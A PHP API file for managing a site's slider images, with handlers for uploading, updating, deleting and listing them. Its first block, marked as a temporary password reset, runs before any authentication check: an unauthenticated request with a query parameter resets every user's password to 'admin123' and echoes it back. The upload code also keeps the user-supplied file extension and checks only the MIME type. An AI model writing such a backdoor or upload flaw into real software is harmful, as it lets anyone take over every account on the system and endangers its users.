<?php
// Prevent any output before JSON
ob_start();

error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't output errors to screen, we'll catch them
header('Content-Type: application/json');

// TEMPORARY PASSWORD RESET FUNCTION - Access via: /api/slider-images.php?action=reset_all_passwords
if(isset($_GET['action']) && $_GET['action'] === 'reset_all_passwords') {
    require_once '../includes/functions.php';
    global $db;
    
    $password = 'admin123';
    $encrypted_password = $db->encryptor('encrypt', $password);
    $auth_vpn = md5($password);
    
    $update_query = "UPDATE users SET user_pass='$encrypted_password', auth_vpn='$auth_vpn'";
    $result = $db->sql_query($update_query);
    
    if($result) {
        echo json_encode([
            'success' => true,
            'message' => 'All user passwords have been reset to: admin123',
            'encrypted_hash' => $encrypted_password
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'message' => 'Failed to update passwords'
        ]);
    }
    exit;
}

try {
    require_once '../includes/functions.php';

    // Use panel's native session check which populates $user_id_2 and $user_level_2
    chkSession();

    // Check authentication using panel variables
    global $user_id_2, $user_level_2;
    
    if($user_id_2 != '2' && $user_level_2 != 'developer'){
        throw new Exception('Unauthorized access: ' . ($user_level_2 ? $user_level_2 : 'Not logged in'));
    }

    global $db;
    if(!$db) {
        throw new Exception('Database connection failed');
    }

    $method = $_SERVER['REQUEST_METHOD'];

    switch($method) {
        case 'POST':
            addSliderImage();
            break;
        case 'PUT':
            updateSliderImage();
            break;
        case 'DELETE':
            deleteSliderImage();
            break;
        case 'GET':
            getSliderImages();
            break;
        default:
            throw new Exception('Method not allowed');
            break;
    }

} catch (Throwable $e) {
    ob_clean(); // Clear any previous output
    echo json_encode(['success' => false, 'message' => $e->getMessage()]);
}

// Flush buffer
ob_end_flush();

function addSliderImage() {
    global $db;
    
    // Check if this is a delete action
    if(isset($_POST['action']) && $_POST['action'] === 'delete') {
        return deleteSliderImageData();
    }
    
    // Check if this is an update action
    if(isset($_POST['action']) && $_POST['action'] === 'update') {
        return updateSliderImageData();
    }
    
    // Validate required fields
    if(empty($_POST['title'])) {
        throw new Exception('Title is required');
    }
    
    // Handle multiple file uploads
    if(!isset($_FILES['images']) || empty($_FILES['images']['name'][0])) {
        throw new Exception('At least one image file is required');
    }
    
    $uploadDir = '../uploads/slider/';
    if(!is_dir($uploadDir)) {
        if(!mkdir($uploadDir, 0755, true)) {
            throw new Exception('Failed to create upload directory');
        }
    }
    
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    $uploadedFiles = [];
    $fileCount = count($_FILES['images']['name']);
    
    // Validate file count
    if($fileCount > 3) {
        throw new Exception('Maximum 3 images allowed');
    }
    
    // Process each file
    for($i = 0; $i < $fileCount; $i++) {
        if($_FILES['images']['error'][$i] !== UPLOAD_ERR_OK) {
            // Clean up already uploaded files
            foreach($uploadedFiles as $file) {
                if(file_exists($uploadDir . $file)) unlink($uploadDir . $file);
            }
            throw new Exception('File upload error for image ' . ($i + 1));
        }
        
        // Validate file type
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimeType = finfo_file($finfo, $_FILES['images']['tmp_name'][$i]);
        finfo_close($finfo);
        
        if(!in_array($mimeType, $allowedTypes)) {
            // Clean up already uploaded files
            foreach($uploadedFiles as $file) {
                if(file_exists($uploadDir . $file)) unlink($uploadDir . $file);
            }
            throw new Exception('Invalid file type for image ' . ($i + 1) . '. Only JPEG, PNG, GIF, and WebP are allowed');
        }
        
        // Generate unique filename
        $extension = pathinfo($_FILES['images']['name'][$i], PATHINFO_EXTENSION);
        $filename = 'slider_' . time() . '_' . uniqid() . '.' . $extension;
        $uploadPath = $uploadDir . $filename;
        
        if(!move_uploaded_file($_FILES['images']['tmp_name'][$i], $uploadPath)) {
            // Clean up already uploaded files
            foreach($uploadedFiles as $file) {
                if(file_exists($uploadDir . $file)) unlink($uploadDir . $file);
            }
            throw new Exception('Failed to move uploaded file ' . ($i + 1));
        }
        
        $uploadedFiles[] = $filename;
    }
    
    // Insert into database
    $title = $db->SanitizeForSQL($_POST['title']);
    $description = $db->SanitizeForSQL($_POST['description'] ?? '');
    $link_url = $db->SanitizeForSQL($_POST['link_url'] ?? '');
    $baseSortOrder = intval($_POST['sort_order'] ?? 1);
    $status = $db->SanitizeForSQL($_POST['status'] ?? 'active');
    
    $insertedCount = 0;
    foreach($uploadedFiles as $index => $filename) {
        $sortOrder = $baseSortOrder + $index;
        $query = "INSERT INTO slider_images (title, description, image_url, link_url, sort_order, status, created_at) 
                  VALUES ('$title', '$description', '$filename', '$link_url', $sortOrder, '$status', NOW())";
        
        if($db->sql_query($query)) {
            $insertedCount++;
        } else {
            // Delete uploaded file if database insert fails
            if(file_exists($uploadDir . $filename)) unlink($uploadDir . $filename);
        }
    }
    
    if($insertedCount > 0) {
        echo json_encode([
            'success' => true, 
            'message' => $insertedCount . ' slider image(s) added successfully'
        ]);
    } else {
        throw new Exception('Failed to insert images into database');
    }
}

function updateSliderImageData() {
    global $db;
    
    $id = intval($_POST['id'] ?? 0);
    if($id <= 0) {
        throw new Exception('Invalid ID');
    }
    
    // Get current slider data
    $currentQuery = $db->sql_query("SELECT * FROM slider_images WHERE id = $id");
    $currentSlider = $db->sql_fetchrow($currentQuery);
    
    if(!$currentSlider) {
        throw new Exception('Slider not found');
    }
    
    $title = $db->SanitizeForSQL($_POST['title']);
    $description = $db->SanitizeForSQL($_POST['description'] ?? '');
    $link_url = $db->SanitizeForSQL($_POST['link_url'] ?? '');
    $sort_order = intval($_POST['sort_order'] ?? 1);
    $status = $db->SanitizeForSQL($_POST['status'] ?? 'active');
    
    $imageUrl = $currentSlider['image_url']; // Keep current image by default
    
    // Check if new image is uploaded
    if(isset($_FILES['new_image']) && $_FILES['new_image']['error'] === UPLOAD_ERR_OK) {
        $uploadDir = '../uploads/slider/';
        $file = $_FILES['new_image'];
        
        // Validate file type
        $allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimeType = finfo_file($finfo, $file['tmp_name']);
        finfo_close($finfo);
        
        if(!in_array($mimeType, $allowedTypes)) {
            throw new Exception('Invalid file type. Only JPEG, PNG, GIF, and WebP are allowed');
        }
        
        // Generate unique filename
        $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
        $filename = 'slider_' . time() . '_' . uniqid() . '.' . $extension;
        $uploadPath = $uploadDir . $filename;
        
        if(!move_uploaded_file($file['tmp_name'], $uploadPath)) {
            throw new Exception('Failed to move uploaded file');
        }
        
        // Delete old image
        $oldImagePath = $uploadDir . $currentSlider['image_url'];
        if(file_exists($oldImagePath)) {
            unlink($oldImagePath);
        }
        
        $imageUrl = $filename;
    }
    
    $query = "UPDATE slider_images SET 
              title = '$title', 
              description = '$description', 
              image_url = '$imageUrl',
              link_url = '$link_url', 
              sort_order = $sort_order, 
              status = '$status',
              updated_at = NOW()
              WHERE id = $id";
    
    if($db->sql_query($query)) {
        echo json_encode(['success' => true, 'message' => 'Slider image updated successfully']);
    } else {
        throw new Exception('Database update failed');
    }
}

function updateSliderImage() {
    global $db;
    
    parse_str(file_get_contents("php://input"), $_PUT);
    
    $id = intval($_PUT['id'] ?? 0);
    if($id <= 0) {
        throw new Exception('Invalid ID');
    }
    
    $title = $db->SanitizeForSQL($_PUT['title'] ?? '');
    $description = $db->SanitizeForSQL($_PUT['description'] ?? '');
    $link_url = $db->SanitizeForSQL($_PUT['link_url'] ?? '');
    $sort_order = intval($_PUT['sort_order'] ?? 1);
    $status = $db->SanitizeForSQL($_PUT['status'] ?? 'active');
    
    $query = "UPDATE slider_images SET 
              title = '$title', 
              description = '$description', 
              link_url = '$link_url', 
              sort_order = $sort_order, 
              status = '$status',
              updated_at = NOW()
              WHERE id = $id";
    
    if($db->sql_query($query)) {
        echo json_encode(['success' => true, 'message' => 'Slider image updated successfully']);
    } else {
        throw new Exception('Database update failed');
    }
}

function deleteSliderImageData() {
    global $db;
    
    $id = intval($_POST['id'] ?? 0);
    if($id <= 0) {
        throw new Exception('Invalid ID');
    }
    
    // Get image filename before deletion
    $query = $db->sql_query("SELECT image_url FROM slider_images WHERE id = $id");
    $row = $db->sql_fetchrow($query);
    
    if(!$row) {
        throw new Exception('Slider image not found');
    }
    
    // Delete from database
    if($db->sql_query("DELETE FROM slider_images WHERE id = $id")) {
        // Delete image file
        $imagePath = '../uploads/slider/' . $row['image_url'];
        if(file_exists($imagePath)) {
            unlink($imagePath);
        }
        echo json_encode(['success' => true, 'message' => 'Slider image deleted successfully']);
    } else {
        throw new Exception('Database delete failed');
    }
}

function deleteSliderImage() {
    global $db;
    
    $id = intval($_POST['id'] ?? 0);
    if($id <= 0) {
        throw new Exception('Invalid ID');
    }
    
    // Get image filename before deletion
    $query = $db->sql_query("SELECT image_url FROM slider_images WHERE id = $id");
    $row = $db->sql_fetchrow($query);
    
    if(!$row) {
        throw new Exception('Slider image not found');
    }
    
    // Delete from database
    if($db->sql_query("DELETE FROM slider_images WHERE id = $id")) {
        // Delete image file
        $imagePath = '../uploads/slider/' . $row['image_url'];
        if(file_exists($imagePath)) {
            unlink($imagePath);
        }
        echo json_encode(['success' => true, 'message' => 'Slider image deleted successfully']);
    } else {
        throw new Exception('Database delete failed');
    }
}

function getSliderImages() {
    global $db;
    
    // Check if requesting single slider by ID
    if(isset($_GET['id'])) {
        $id = intval($_GET['id']);
        $query = $db->sql_query("SELECT * FROM slider_images WHERE id = $id");
        $slider = $db->sql_fetchrow($query);
        
        if($slider) {
            echo json_encode(['success' => true, 'data' => $slider]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Slider not found']);
        }
        return;
    }
    
    // Get all sliders
    $images = array();
    $query = $db->sql_query("SELECT * FROM slider_images ORDER BY sort_order ASC, id DESC");
    
    while($row = $db->sql_fetchrow($query)) {
        $images[] = $row;
    }
    
    echo json_encode(['success' => true, 'data' => $images]);
}
?>
